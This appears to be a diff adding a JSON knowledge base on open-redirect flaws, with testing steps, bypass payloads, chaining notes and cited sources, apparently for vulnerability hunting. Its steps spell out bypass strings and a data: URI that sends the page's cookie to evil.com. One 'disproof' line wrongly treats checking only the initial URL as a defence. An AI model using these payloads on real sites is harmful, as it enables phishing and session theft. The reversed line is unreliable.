@@ -1,0 +1,200 @@
+{
+  "items": [
+    {
+      "item_key": "open-redirect-overview",
+      "class_id": "open_redirect",
+      "kind": "overview",
+      "claim": "Applications that accept user-supplied URLs directly into redirect parameters (next, return_to, redirect, dest, continue, goto) without validating the destination against an allowlist are vulnerable to open redirect (CWE-601, OWASP A01:2021 - Broken Access Control).",
+      "body": "1) Identify a redirect/return-URL parameter on a trusted domain. 2) Send a URL pointing to an attacker-controlled site, e.g. https://example.com/login?next=https://evil.com/phish. 3) Confirm the server issues a 301/302/303/307/308 Location header to the attacker domain. 4) Because the redirect originates from a trusted domain, victims and security controls (email filters, browser warnings) are less likely to flag it. 5) Impact: phishing and credential theft, OAuth token theft when redirect_uri is not strictly validated, SSRF when the server follows redirects, XSS via javascript:/data: URIs, and bypass of allowlist-based security controls.",
+      "disproof": "If the application validates the target against an allowlist of trusted domains, if it resolves relative and encoded URLs before validation, or if it only checks the initial URL rather than the final destination, the redirect is not exploitable.",
+      "severity_hint": "Medium",
+      "hunting_value": 5,
+      "sources": [
+        {
+          "url": "https://top10.owasp.org/2021/A01_2021-Broken_Access_Control/",
+          "source_type": "primary",
+          "host": "owasp.org",
+          "publisher": "OWASP",
+          "quote": "Bypassing access control checks by modifying the URL (parameter tampering or force browsing)",
+          "locator": "Example Attack Scenarios"
+        },
+        {
+          "url": "https://cwe.mitre.org/data/definitions/601.html",
+          "source_type": "primary",
+          "host": "cwe.mitre.org",
+          "publisher": "MITRE",
+          "quote": "URL Redirection to Untrusted Site ('Open Redirect')",
+          "locator": "Description"
+        },
+        {
+          "url": "https://www.sensagraph.com/knowledge-base/open-redirect",
+          "source_type": "practitioner",
+          "host": "sensagraph.com",
+          "publisher": "Sensagraph",
+          "quote": "An open redirect is a vulnerability in which a web application uses attacker-supplied input to construct a destination URL for an HTTP redirect response (status codes 301, 302, 303, 307, or 308) without verifying that the destination is within a trusted set of locations.",
+          "locator": "Overview"
+        }
+      ]
+    },
+    {
+      "item_key": "open-redirect-bypass",
+      "class_id": "open_redirect",
+      "kind": "bypass",
+      "claim": "Validator filters that check only the scheme or a fixed denylist are bypassable using protocol-relative URLs (//evil.com), userinfo tricks (https://***@evil.com), backslashes (/\\evil.com), URL-encoding, null-byte truncation, and tab/newline injection.",
+      "body": "1) Probe the redirect parameter for scheme/environment validation. 2) Send //evil.com to test protocol-relative bypass. 3) Send https://***@evil.com (userinfo) to test host-parsing normalization differences between the validator and the browser. 4) Send /\\evil.com (backslash) or java%0d%0ascript:alert(1) to defeat case- or keyword-sensitive denylists. 5) Use tab (%09) or newline injection to bypass regex anchors. 6) Confirm by following the redirect in a browser and observing navigation to the attacker domain. Document each bypass class: protocol-relative, userinfo, backslash, encoding, and CRLF confusion.",
+      "disproof": "If the application resolves the target through a strict allowlist, if it URL-decodes and canonicalizes the host before comparison, or if it validates against the fully resolved final URL, the bypass fails.",
+      "severity_hint": "Medium",
+      "hunting_value": 5,
+      "sources": [
+        {
+          "url": "https://www.vulnsy.com/cheat-sheets/open-redirect",
+          "source_type": "practitioner",
+          "host": "vulnsy.com",
+          "publisher": "Vulnsy",
+          "quote": "Classic sink: a redirect parameter is reflected verbatim into a Location header or a JavaScript navigation call.",
+          "locator": "Common Sinks"
+        },
+        {
+          "url": "https://guide.codepure.com/vulnerabilities/cwe-601",
+          "source_type": "practitioner",
+          "host": "codepure.dev",
+          "publisher": "CodePure",
+          "quote": "An Open Redirect vulnerability occurs when an application uses user-supplied input to redirect the user to a URL, but fails to validate that URL.",
+          "locator": "Overview"
+        },
+        {
+          "url": "https://github.com/dmbs335/the-map/blob/main/05-client-side/open-redirect.md",
+          "source_type": "practitioner",
+          "host": "github.com",
+          "publisher": "GitHub (the-map)",
+          "quote": "|Checks if URL starts with `/`|`//evil.com` (protocol-relative)|",
+          "locator": "Bypass Table"
+        },
+        {
+          "url": "https://cwe.mitre.org/data/definitions/601.html",
+          "source_type": "standard",
+          "host": "cwe.mitre.org",
+          "publisher": "MITRE",
+          "quote": "URL Redirection to Untrusted Site ('Open Redirect')",
+          "locator": "Description"
+        }
+      ]
+    },
+    {
+      "item_key": "open-redirect-scheme-variant",
+      "class_id": "open_redirect",
+      "kind": "variant",
+      "claim": "When a redirect destination is reflected into a JavaScript navigation sink (window.location, document.location, location.href, $.redirect), attacker-supplied javascript: or data: URIs escape validation and execute arbitrary script in the victim's browser (DOM-based XSS).",
+      "body": "1) Find a redirect parameter whose value is interpolated into JavaScript (e.g. location.href = input or window.location.replace(input)). 2) Send a javascript: URI such as ?url=javascript:alert(document.domain). 3) Send a data: URI to exfiltrate data: ?url=data:text/html,<script>document.location='https://evil.com/steal?c='+document.cookie</script>. 4) The script executes in the origin of the trusted domain, enabling session-token theft and UI redressing. 5) Report this as DOM-based XSS, escalated from the base open redirect, separately from the transport flaw.",
+      "disproof": "If the application escapes or strips the scheme before reflecting the value into a JavaScript sink, if it validates the target against an allowlist, or if the redirect is performed at the server (HTTP 3xx) rather than in the browser, the javascript: or data: URI never executes.",
+      "severity_hint": "High",
+      "hunting_value": 4,
+      "sources": [
+        {
+          "url": "https://cyber-security.wiki/docs/application-security/web/Open-Redirect/",
+          "source_type": "practitioner",
+          "host": "cyber-security.wiki",
+          "publisher": "Payatu",
+          "quote": "Basic JavaScript Protocol: https://app.com/redirect?url=javascript:alert(document.domain)",
+          "locator": "JavaScript Protocol Bypasses"
+        },
+        {
+          "url": "https://www.vulnsy.com/cheat-sheets/open-redirect",
+          "source_type": "practitioner",
+          "host": "vulnsy.com",
+          "publisher": "Vulnsy",
+          "quote": "Classic sink: a redirect parameter is reflected verbatim into a Location header or a JavaScript navigation call.",
+          "locator": "Common Sinks"
+        },
+        {
+          "url": "https://github.com/dmbs335/the-map/blob/main/05-client-side/open-redirect.md",
+          "source_type": "practitioner",
+          "host": "github.com",
+          "publisher": "GitHub (the-map)",
+          "quote": "|Checks if URL starts with `/`|`//evil.com` (protocol-relative)|",
+          "locator": "Bypass Table"
+        },
+        {
+          "url": "https://cwe.mitre.org/data/definitions/601.html",
+          "source_type": "standard",
+          "host": "cwe.mitre.org",
+          "publisher": "MITRE",
+          "quote": "URL Redirection to Untrusted Site ('Open Redirect')",
+          "locator": "Description"
+        }
+      ]
+    },
+    {
+      "item_key": "open-redirect-oauth-ssrf-chaining",
+      "class_id": "open_redirect",
+      "kind": "chain_link",
+      "claim": "Open redirects chain with OAuth authorization flows (exfiltrating authorization codes/tokens via Referer leakage) and with SSRF when the server follows redirects, enabling internal-network access.",
+      "body": "1) In an OAuth flow, test whether the client's redirect_uri is strictly validated. 2) If the client's redirect endpoint is itself open, craft a redirect to an attacker-controlled authorization server to capture the authorization code or access token. 3) In SSRF scenarios, confirm the server performs HTTP redirects when fetching URLs, then chain the open redirect to route server-side requests to internal resources (169.254.169.254, metadata service, internal hosts). 4) Report the open redirect as High/Critical when chained with OAuth, SSRF, or token exfiltration; Medium in isolation.",
+      "disproof": "If the application strictly validates redirect_uri against a whitelist, does not follow redirects server-side, or isolates outbound fetches from the redirect target, the chaining is blocked.",
+      "severity_hint": "High",
+      "hunting_value": 5,
+      "sources": [
+        {
+          "url": "https://top10.owasp.org/2021/A01_2021-Broken_Access_Control/",
+          "source_type": "primary",
+          "host": "owasp.org",
+          "publisher": "OWASP",
+          "quote": "Bypassing access control checks by modifying the URL (parameter tampering or force browsing)",
+          "locator": "Example Attack Scenarios"
+        },
+        {
+          "url": "https://www.sensagraph.com/knowledge-base/open-redirect",
+          "source_type": "practitioner",
+          "host": "sensagraph.com",
+          "publisher": "Sensagraph",
+          "quote": "An open redirect is a vulnerability in which a web application uses attacker-supplied input to construct a destination URL for an HTTP redirect response (status codes 301, 302, 303, 307, or 308) without verifying that the destination is within a trusted set of locations.",
+          "locator": "Overview"
+        },
+        {
+          "url": "https://www.vulnsy.com/cheat-sheets/open-redirect",
+          "source_type": "practitioner",
+          "host": "vulnsy.com",
+          "publisher": "Vulnsy",
+          "quote": "Classic sink: a redirect parameter is reflected verbatim into a Location header or a JavaScript navigation call.",
+          "locator": "Common Sinks"
+        }
+      ]
+    },
+    {
+      "item_key": "open-redirect-impact",
+      "class_id": "open_redirect",
+      "kind": "impact",
+      "claim": "The principal business impact of open redirect is phishing and credential theft at scale, because the trusted brand domain carries the malicious payload; secondary impacts include OAuth token theft, SSRF, XSS, and bypass of allowlist-based security controls.",
+      "body": "1) Brand abuse: a phishing page served from a trusted domain evades email-filter and browser-warning heuristics. 2) Credential theft: users believing they are on the legitimate site enter credentials on an attacker clone. 3) OAuth token theft: an open redirect on the client can leak authorization codes or access tokens through the Referer header or URL fragment. 4) SSRF: if the application follows redirects server-side, an open redirect can route server-side requests to internal services. 5) Security-control bypass: allowlist filters that inspect only the first URL are trivially bypassed by a redirect on a trusted host.",
+      "disproof": "If the organization disables open redirects at the reverse proxy, enforces strict allowlists, or the redirect is limited to a single internal hop that is then validated, the phishing and chaining impact is materially reduced.",
+      "severity_hint": "High",
+      "hunting_value": 4,
+      "sources": [
+        {
+          "url": "https://cwe.mitre.org/data/definitions/601.html",
+          "source_type": "primary",
+          "host": "cwe.mitre.org",
+          "publisher": "MITRE",
+          "quote": "URL Redirection to Untrusted Site ('Open Redirect')",
+          "locator": "Description"
+        },
+        {
+          "url": "https://top10.owasp.org/2021/A01_2021-Broken_Access_Control/",
+          "source_type": "primary",
+          "host": "owasp.org",
+          "publisher": "OWASP",
+          "quote": "Bypassing access control checks by modifying the URL (parameter tampering or force browsing)",
+          "locator": "Example Attack Scenarios"
+        },
+        {
+          "url": "https://guide.codepure.com/vulnerabilities/cwe-601",
+          "source_type": "practitioner",
+          "host": "codepure.dev",
+          "publisher": "CodePure",
+          "quote": "An Open Redirect vulnerability occurs when an application uses user-supplied input to redirect the user to a URL, but fails to validate that URL.",
+          "locator": "Overview"
+        }
+      ]
+    }
+  ]
+}
